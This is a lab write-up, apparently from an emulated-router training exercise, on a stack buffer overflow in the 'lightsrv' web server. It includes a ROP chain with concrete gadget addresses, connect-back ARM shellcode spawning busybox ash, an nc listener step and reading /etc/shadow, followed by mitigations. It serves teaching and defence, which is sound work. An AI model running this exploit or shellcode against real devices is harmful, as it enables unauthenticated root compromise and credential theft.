# Vulnerability 1: Stack Buffer Overflow in `lightsrv`

The web server at `/usr/bin/lightsrv` is vulnerable to a stack buffer overflow ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)) in the main request processing loop.

## Impact

The vulnerable webserver runs at root and is accessible over port 8080 in the default configuration.
The vulnerability can be triggered without authentication.
Since stack canaries and ASLR are not enabled, it can be trivially exploited to gain remote code execution.

## Details

The vulnerability exists in `handle_single_request`, which is called whenever the HTTP server receives a new connection.
The pseudocode is as follows:

```c
int handle_single_request(int extSocket)
{
  [...]
  (global) size_t chunkSize = 0;
  (global) char chunk[0x800]
  char* nextChunkPointer;
  char requestBuffer [4100];
  
  nextChunkPointer = requestBuffer;
  while ((chunkSize != 0 || (prevRequestSize = recv(extSocket, chunk, 0x800, 0), 0 < (int)chunkSize))) {
    memcpy(requestBufferPointer, chunk, chunkSize);
    nextChunkPointer += chunkSize;
    chunkSize = 0;
    pvVar2 = memmem(requestBuffer,(int)nextChunkPointer - (int)requestBuffer,"\r\n\r\n",4);
    if (pvVar2 != (void *)0x0) {
      [...parse the request...]
    }
  }
  return -1;
}
```

Even more abstractly, the processing loop goes like this:
- First, we create a stack buffer of size `0x1000`(ish) to hold the request.
- Next, we read the incoming request in chunks of size `0x800`
- After each chunk, we check to see if the request has the string "\r\n". If so, we process it as a HTTP request.
**Otherwise, we just keep reading chunks.**
- If the connection closes without finding "\r\n", we simply return -1.

Even more interesting is what's missing from this function:
- **There is no check to ensure we only read up to `0x1000` bytes from the socket.**
Thus we can trivially overflow the `requestBuffer` by sending a request longer than `0x1000` bytes,
as long as it doesn't contain "\r\n".
- Furthermore, we see at the return statement that **this function doesn't have a stack cookie.**
Thus we can trivially use our overflow to overwrite the saved instruction pointer and gain code execution.

## Exploitation

### Checking Mitigations

As usual, we start exploiting the bug by checking which protections are present. We already mentioned that there's
**no stack canary**. In the default configuration of the router, there's also **no ASLR**:

```
/ # cat /proc/kernel/randomize_va_space
0
```

This is great news. ASLR is the death knell of many a remote memory corruption bug. Its absence will make our job
infinitely easier.

Since there's no ASLR, we can find the locations and memory protections of all loaded binaries from `/proc/maps`:

```
/ # cat /proc/$(pgrep lightsrv)/maps
00010000-00012000 r-xp 00000000 00:0d 2908199    /usr/bin/lightsrv
00022000-00023000 rw-p 00002000 00:0d 2908199    /usr/bin/lightsrv
00023000-00025000 rw-p 00000000 00:00 0          [heap]
40000000-40007000 r-xp 00000000 00:0d 2789485    /lib/ld-uClibc-0.9.33.2.so
40007000-40008000 r-xp 00000000 00:00 0          [sigpage]
40008000-4000a000 rw-p 00000000 00:00 0 
40016000-40017000 r--p 00006000 00:0d 2789485    /lib/ld-uClibc-0.9.33.2.so
40017000-40018000 rw-p 00007000 00:0d 2789485    /lib/ld-uClibc-0.9.33.2.so
40018000-40023000 r-xp 00000000 00:0d 2789501    /lib/libgcc_s.so.1
40023000-40033000 ---p 00000000 00:00 0 
40033000-40034000 rw-p 0000b000 00:0d 2789501    /lib/libgcc_s.so.1
40034000-4007c000 r-xp 00000000 00:0d 2789560    /lib/libuClibc-0.9.33.2.so
4007c000-4008b000 ---p 00000000 00:00 0 
4008b000-4008c000 r--p 00047000 00:0d 2789560    /lib/libuClibc-0.9.33.2.so
4008c000-4008d000 rw-p 00048000 00:0d 2789560    /lib/libuClibc-0.9.33.2.so
4008d000-40091000 rw-p 00000000 00:00 0 
befdf000-bf000000 rw-p 00000000 00:00 0          [stack]
ffff0000-ffff1000 r-xp 00000000 00:00 0          [vectors]
```

Finally, we find a protection that *is* enabled: NX. Since there aren't any RWX pages, we'll have to do some
return-oriented shenanigans to execute shellcode. This will be our first task

### Building Our ROP Chain

In order to execute shellcode, we need two things: a place to put it, and a way to call `mprotect()`
so we can mark that place as executable.

The first part is easy. Since we control the entire contents of the `0x1000`-byte `requestBuffer` on the stack, we can
simply send our shellcode as part of our request. **Thus our shellcode will be stored on the stack;
thus we need to mark the stack as executable.**

This is where `mprotect()` comes in. If we can call `mprotect(STACK_ADDRESS, STACK_SIZE, 0x7)`, we can mark the stack
as `rwx` and run our shellcode with no issues. This process takes two steps:

1) Find gadgets that let us load these values into the argument registers `r0, r1, r2`.
2) Find a gadget that lets us call `mprotect()`.

For the first step, we use `ropper`. We know from our `/proc/maps` nonsense that only three binaries are loaded by
`lightsrv`: `ld-uClibc-0.9.33.2.s0`, `libgcc_s.so.1`, and `lightsrv` itself. We can run `ropper` to search for `pop`
gadgets in each of these binaries:

```
┌──(cd80㉿kali)-[~/…/emux/DV-ARM/rootfs-arm/lib]
└─$ ropper                                        
(ropper)> file libgcc_s.so.1
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libgcc_s.so.1/ELF/ARM)> search /1/ pop
[INFO] Searching for gadgets: pop

[INFO] File: libgcc_s.so.1
0x00004da4: pop {r0, pc}; 
0x00005578: pop {r0, r1, r2, r3, pc}; 
[...]
```

Right away, we find what we need. This second gadget (the one at offset `0x5578`) lets us pop arbitrary values from the
(overwritten) stack into `r0, r1, r2, r3`.

### The Strange `mprotect()` Gadget

Alright, cool. Now that we can set the arguments to our desired values, we can just go ahead and find the address of
`mprotect()`...

```
/ # strings libgcc_s.so.1 | grep mprotect
Nope!
/ #
```

Hm. That's a problem.

So yes -- it seems like on some embedded devices, **`mprotect()` isn't even compiled into `libc`.** This is a problem --
without `mprotect()`, there's no way to mark the stack as executable and run our shellcode...

...or is there?

In a strange twist of fate, one exploit mitigation saves us from another. Huge nerds in the audience might know the tale
of `GNU_RELRO`, which is a way to mark certain parts of a binary as read-only shortly after loading it. All binary
loaders support this option -- **including the one present on this device, `ld-uClibc-0.9.33.2.so`**. Thus there must be
*some* code inside this binary that calls `mprotect()`, or something equivalent.

Opening the shared object in Ghidra, we immediately find a suspicious function called `_dl_protect_relro()`. The
decompiled pseudocode of this function goes like this:

```c
void _dl_protect_relro(int *param_1)

{
  uint uVar1;
  
  uVar1 = param_1[0x3f] + *param_1 & 0xfffff000;
  if (uVar1 == (param_1[0x3f] + *param_1 + param_1[0x40] & 0xfffff000U)) {
    return;
  }
  software_interrupt(0);
  if (uVar1 < 0xfffff001) {
    if (-1 < (int)uVar1) {
      return;
    }
  }
  else {
    _dl_errno = -uVar1;
  }
  _dl_dprintf(2,"%s: cannot apply additional memory protection after relocation",param_1[1]);
  software_interrupt(0);
  return;
}
```

This code doesn't seem to call `mprotect()`. However, it *does* call a software interrupt directly. Let's zoom in on the
assembly for that call:

```asm
        00011ec4 01 10 60 e0     rsb        r1,r0,r1
        00011ec8 01 20 a0 e3     mov        r2,#0x1
        00011ecc 7d 70 a0 e3     mov        r7,#0x7d
        00011ed0 00 00 00 ef     swi        0x0
```

We immediately find a hint that this is useful. The third argument to `mprotect()` (that is, the one passed in `r2`) is
the permissions of the region. Here, we see `0x1` being loaded into `r2`. Cursory googling reveals that this is the flag
to map a region as read-only. Could this interrupt be a low-level way of calling `mprotect()`?

To confirm, we look up [a list of ARMv8 interrupt codes](https://syscalls.w3challs.com/?arch=arm_thumb) and find:

```
[...]
mprotect   |   0x7d
[...]
```

Just as suspected -- `0x7d` is the value being loaded into `r7`! We can thus conclude with confidence that **this is a
direct call to mprotect()**.

This will act as our `mprotect()` gadget. By calling right into the middle of this function (right at the instruction
`mov r7, #0x7d`), **we can effectively call `mprotect()` with pre-filled arguments**!

The only thing to worry about is cleaning up the stack. Thankfully, this function returns immediately if the call to
`mprotect()` succeeds:

```asm
        00011ed0 00 00 00 ef     swi        0x0
        [...]
        00011eec 00 00 50 e3     cmp        r0,#0x0
        00011ef0 90 88 bd a8     ldmiage    sp!,{r4 r7 r11 pc}
```

Thus all we have to do is pack three throwaway values onto the stack, and we can get right on with our ROP chain. Nice.

### Putting it All Together

We've gathered all the pieces of our ROP chain. Now it's time to put them together:

```python
    # put our shellcode at the top of the request, then fill it to trigger the overflow
    payload = SHELLCODE + (b"\xAA" * (0x1024 - len(SHELLCODE)))
    
    # first, return to our gadget that pops the argument registers
    payload += pwnlib.util.packing.pack(LIBGCC_BASE + POP_GADGET_OFFSET, 32, "little")
    payload += pwnlib.util.packing.pack(STACK_BASE, 32, "little")  # first arg to mprotect(): the address of the stack
    payload += pwnlib.util.packing.pack(STACK_SIZE, 32, "little")  # second arg: the size of the stack
    payload += pwnlib.util.packing.pack(0x7, 32, "little")  # third arg: the mode (0x7 = RWX)
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")  # since r3 is popped too, throw in some veal
    
    # next, call into our mprotect() gadget
    payload += pwnlib.util.packing.pack(LD_BASE + MPROTECT_OFFSET, 32, "little")
    
    # returning from this gadget pops three useless values, so here they are:
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")
    payload += pwnlib.util.packing.pack(0xdeadbeef, 32, "little")

    # finally, with the stack marked as executable, run our shellcode:
    payload += pwnlib.util.packing.pack(SHELLCODE_ADDRESS, 32, "little")
```

Since ASLR is disabled, finding all of these addresses and offsets is a breeze:
- From `/proc/maps`, we know that
  - `LIBGCC_BASE = 0x40018000`
  - `LD_BASE = 0x40000000`
  - `STACK_BASE = 0xbefdf000`
  - `STACK_SIZE` = `0xbf000000 - STACK_BASE`
- From `ropper`, we know `POP_GADGET_OFFSET = 0x5578`
- From Ghidra, `MPROTECT_OFFSET = 0x1ecc`
- Finally, by attaching `gdb` to `lightsrv` and breaking when data is copied into our buffer, we can find that
`SHELLCODE_ADDRESS = 0xbeffe9f8`.

We're almost done! Just one step left: writing the shellcode.

## `busybox` Makes Shellcode Weird

This part is mostly straightforward. Since we're exploiting a remote system, the gold standard is to use connect-back
shellcode. This is very much a solved problem, and indeed, [we can steal 90% of it from an existing solution](https://www.exploit-db.com/shellcodes/46736). 

However, since we're dealing with embedded systems, there is one kink to work out. It lies in the very last part of the shellcode:

```asm
    adr   r0, command
    eor   r2, r2
    eor   r1, r1
    strb  r2, [r0, #7]
    mov   r7, #11 
    svc   #1
    
    [...]
    command:
        .ascii "/bin/sh\xff"  // \xff is overwritten with a null byte before it's used
```

This code calls `execve("/bin/sh")` with an empty `argv` and `envp`. On systems where `/bin/sh` is its own binary,
this is fine. Sadly, on most embedded systems, `/bin/sh` is actually an alias for `busybox`:

```
┌──(cd80㉿kali)-[~/…/emux/DV-ARM/rootfs-arm/bin]
└─$ file ash                                     
ash: symbolic link to busybox
```

This means that when we call `/bin/ash`, the command is changed to `/bin/busybox ash`.
**This translation does not occur when we call `/bin/sh` using `execve()`**. Thus the command we actually have to
execute is `/bin/busybox ash`, which requires a non-null `argv`.

The code to do so is pretty self-explanatory. The only tricky part is to make space for the fake `argv` (which,
remember, is an array of pointers) on the stack:

```
    sub sp, sp, #0x8
    eor r2, r2  // zero r2 without null bytes
    str r2, [sp, #0x4] // put a null pointer at the end of argv
    adr r1, SHELL
    strb r2, [r1, #0x3]  // zero the byte at the end of ash\xff...
    str r1, [sp]  // ...and make it the first entry in our argv

    adr r0, BUSYBOX  // load the actual busybox command
    strb r2, [r0, #0x8]  // zero the byte at the end of /bin/ash\xff
    mov r1, sp  // pass the fake argv...
    mov r7, #11  // ...set the syscall to execve()...
    svc #1  // ..and do it.
    
    SHELL:
        .ascii "ash\xff"

    BUSYBOX:
        .ascii "/bin/ash\xff\xff\xff\xff"
```

(editor's note: we don't *really* have to write this shellcode without null bytes, since it's read via `read()` and not
`strcpy()` or something. however, it's still good practice for string bugs that we'll see later.)

### Assuming Direct Control

With shellcode in hand, we can finally do the thing. Our final exploit script can be found in `lightsrv_overflow.py`.

1) Start the router using EMUX, forwarding the vulnerable port 8080 to 28080.
2) In another tab, open an EMUX terminal and start the listener: `nc -lvp 52608`
3) Run the exploit script: `python lightsrv_overflow.py`
4) In the listener tab, enter the password `cd80`
5) `cat /etc/shadow`, etc.

## Mitigations

The root cause of this exploit is that incoming requests are read past the end of the buffer. To fix this, the read loop
in `handle_single_request()` should only accept up to `0x1000` bytes.

Compiling this binary with stack canaries would also neuter this bug, and enabling ASLR would make it much more
frustrating (though, since the service restarts itself, not impossible!) to exploit.
